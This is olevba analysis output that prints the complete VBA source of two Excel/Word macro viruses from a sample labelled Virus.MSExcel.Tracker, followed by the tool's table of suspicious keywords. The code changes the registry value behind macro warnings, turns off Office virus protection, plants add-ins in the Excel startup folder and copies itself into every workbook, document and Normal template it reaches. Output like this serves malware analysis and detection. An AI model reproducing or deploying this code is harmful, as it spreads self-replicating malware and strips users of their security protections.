olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tracker-based-6016ce7f7cf18409d4350f8bae9dd197d7a01009
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Tracker-based-6016ce7f7cf18409d4350f8bae9dd197d7a01009 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit



Private Const cstrSection     As String = "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
Private Const cstrEngine      As String = "8'4.XLS"
Private Const cstrModule      As String = "ThisWorkbook"
Private Const cstrKeyName     As String = "Options6"
Private Const cstrVolumeData  As String = "IVID"

Private Declare Function GetVolumeInformation Lib "KERNEL32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As Long, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As Long, ByVal nFileSystemNameSize As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "ADVAPI32.DLL" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "ADVAPI32.DLL" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "ADVAPI32.DLL" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long

Private WithEvents mapp As Application
Attribute mapp.VB_VarHelpID = -1










Private Sub Workbook_Open()
  Dim strEngine     As String
  Dim wbkEngine     As Workbook
  Dim cmdEngine     As Object
  Dim lngRegKey     As Long
  Dim lngRegType    As Long
  Dim lngRegValue   As Long
  Dim lngVolumeID   As Long
  On Error Resume Next
  If (RegOpenKeyEx(&H80000001, cstrSection, 0, &H2001F, lngRegKey) = 0) Then
    RegQueryValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue, 4
    RegSetValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue And Not 8, 4
    RegCloseKey lngRegKey
  End If
  strEngine = UCase$(Application.StartupPath + "\" + cstrEngine)
  If UCase$(Me.FullName) = strEngine Then
    Set mapp = Application
  ElseIf Len(Dir(strEngine)) = 0 Then
    Application.ScreenUpdating = False
    If Len(Dir(Application.StartupPath, vbDirectory)) = 0 Then MkDir Application.StartupPath
    Set wbkEngine = Workbooks.Add
    wbkEngine.IsAddin = True
    Intrude wbkEngine
    GetVolumeInformation Left$(strEngine, InStr(1, strEngine, "\")), 0, 0, lngVolumeID, 0, 0, 0, 0
    wbkEngine.CustomDocumentProperties.Add cstrVolumeData + Hex$(lngVolumeID), False, msoPropertyTypeString, ""
    wbkEngine.SaveAs strEngine, xlAddIn
    wbkEngine.Close
    If (lngRegValue And 8) = 8 Then
      Set cmdEngine = Me.VBProject.VBComponents(cstrModule).CodeModule
      cmdEngine.DeleteLines 1, cmdEngine.CountOfLines
      Me.Save
    End If
    Application.ScreenUpdating = True
  Else
    CopyVolumesData Workbooks(cstrEngine)
  End If
End Sub

Private Sub mapp_WorkbookBeforeSave(ByVal Wb As Excel.Workbook, ByVal SaveAsUI As Boolean, Cancel As Boolean)
  On Error Resume Next
  Intrude Wb
End Sub

Private Sub mapp_WorkbookBeforeClose(ByVal Wb As Excel.Workbook, Cancel As Boolean)
  On Error Resume Next
  If Len(Wb.Path) <> 0 Then If Intrude(Wb) Then Wb.Save
End Sub

Private Function Intrude(wbkTarget As Workbook) As Boolean
  Dim cmdSource As Object
  Dim cmdTarget As Object
  On Error Resume Next
  Intrude = False
  Set cmdSource = Me.VBProject.VBComponents(cstrModule).CodeModule
  Set cmdTarget = wbkTarget.VBProject.VBComponents(cstrModule).CodeModule
  If cmdTarget.CountOfLines <= 2 Then
    cmdTarget.DeleteLines 1, cmdSource.CountOfLines
    cmdTarget.AddFromString cmdSource.Lines(1, cmdSource.CountOfLines)
    CopyVolumesData wbkTarget
    Intrude = True
  End If
End Function

Private Sub CopyVolumesData(wbkTarget As Workbook)
  Dim pptVolume As DocumentProperty
  On Error Resume Next
  For Each pptVolume In Me.CustomDocumentProperties
    If Left$(pptVolume.Name, Len(cstrVolumeData)) = cstrVolumeData Then
      wbkTarget.CustomDocumentProperties.Add pptVolume.Name, False, pptVolume.Type, ""
      wbkTarget.CustomDocumentProperties(pptVolume.Name).Value = pptVolume.Value
    End If
  Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Tracker-based-6016ce7f7cf18409d4350f8bae9dd197d7a01009 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Tracker-based-6016ce7f7cf18409d4350f8bae9dd197d7a01009 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Tracker-based-6016ce7f7cf18409d4350f8bae9dd197d7a01009 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Tracker-based-6016ce7f7cf18409d4350f8bae9dd197d7a01009 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Tracker-based-6016ce7f7cf18409d4350f8bae9dd197d7a01009 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Xlscan.bas 
in file: Virus.MSExcel.Tracker-based-6016ce7f7cf18409d4350f8bae9dd197d7a01009 - OLE stream: '_VBA_PROJECT_CUR/VBA/Xlscan'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Declare Function GetPrivateProfileStringA Lib "kernel32.dll" (ByVal lpSection As String, ByVal lpSetting As String, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Attribute GetPrivateProfileStringA.VB_ProcData.VB_Invoke_Func = " \n14"
Declare Function WritePrivateProfileStringA Lib "kernel32.dll" (ByVal lpSection As String, ByVal lpSetting As String, ByVal lpValue As String, ByVal lpFileName As String) As Long
Attribute WritePrivateProfileStringA.VB_ProcData.VB_Invoke_Func = " \n14"
Declare Function RegOpenKeyExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Attribute RegOpenKeyExA.VB_ProcData.VB_Invoke_Func = " \n14"
Declare Function RegQueryValueExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
Attribute RegQueryValueExA.VB_ProcData.VB_Invoke_Func = " \n14"
Declare Function RegSetValueExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Attribute RegSetValueExA.VB_ProcData.VB_Invoke_Func = " \n14"
Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Attribute RegCloseKey.VB_ProcData.VB_Invoke_Func = " \n14"
Global Const REG_DWORD As Long = 4
Global Const REG_SZ As Long = 1
Global Const HKEY_CURRENT_USER As Long = &H80000001
Global Const HKEY_LOCAL_MACHINE As Long = &H80000002
Dim k As Long
Dim s As Long
Dim u As Long
Dim a As Long
Dim b As String

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo push_data
b = String(7, 0)
s = 256
v$ = String$(s, 0)
Application.ScreenUpdating = False
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayAlerts = wdAlertsNone
u = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\O", 0, KEY_ALL_ACCESS, k)
u = RegSetValueExA(k, "Options6", 0, REG_DWORD, Chr$(0), 4)
u = RegCloseKey(k)
ShowVisualBasicEditor = False
Open "c:\Windows\System\Xlscan.386" For Input As 1
Close 1
GoTo god

push_data:
If Dir(Application.StartupPath + "\Xlscan.xls") = "Xlscan.xls" Then
  Windows("Xlscan.xls").Visible = True
  Application.VBE.ActiveVBProject.VBComponents("Xlscan").Export "c:\Windows\System\Xlscan.386"
  Windows("Xlscan.xls").Visible = False
Else
  Application.VBE.ActiveVBProject.VBComponents("Xlscan").Export "c:\Windows\System\Xlscan.386"
End If

god:
On Error GoTo god_1
If ActiveDocument = "" Then GoTo god_3
With Options
.VirusProtection = False
.ConfirmConversions = False
.SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "Xlscan" Then r = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Xlscan" Then e = True
Next i
If e = False Then
With ActiveDocument.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
If r = False Then
With NormalTemplate.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
End If
GoTo god_1

god_3:
If Dir(Application.StartupPath + "\Xlscan.xls") = "Xlscan.xls" Then p = True
For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Xlscan" Then t = True
Next i
If t = False Then
With ActiveWorkbook.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
End If
If p = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath + "\Xlscan.xls"
With ActiveWorkbook.VBProject
With .VBComponents.Import("c:\Windows\System\Xlscan.386")
End With
End With
ActiveWindow.Visible = False
Workbooks("Xlscan.xls").Save
c = WritePrivateProfileStringA("Booting_index", "Windows_system", ".False.", "c:\Windows\System\Xlscan.idx")
End If
a = GetPrivateProfileStringA("Booting_index", "Windows_system", "", b, 255, "c:\Windows\System\Xlscan.idx")
If b = ".False." Then GoTo god_1

god_1:
On Error GoTo toend
Application.ScreenUpdating = True
end_ = Str((Month(Now()))) + Str((Day(Now()))) + Str((Hour(Now()))) + Str((Minute(Now()))) + Str((Second(Now())))
For save_file = 1 To 10
  Application.VBE.ActiveVBProject.VBComponents("Xlscan").Export "c:\Windows\System\" + end_ + Str(save_file) + ".vcx"
Next save_file

toend:
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = " \n14"
 ShowVisualBasicEditor = False
End Sub
Sub AutoExit()
Attribute AutoExit.VB_ProcData.VB_Invoke_Func = " \n14"
Call Auto_Close
End Sub
Sub ToolsMacro()
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = " \n14"
End Sub
Sub FileTemplates()
Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = " \n14"
End Sub
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "Xlscan.Auto_Close"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - t¬$Á
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - t¬$Á
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 
ÈpÈÅ
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 
ÈpÈÅ
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 2 è²Ä¬3
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|RegQueryValueEx     |May read registry keys                       |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|          |A                   |                                             |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
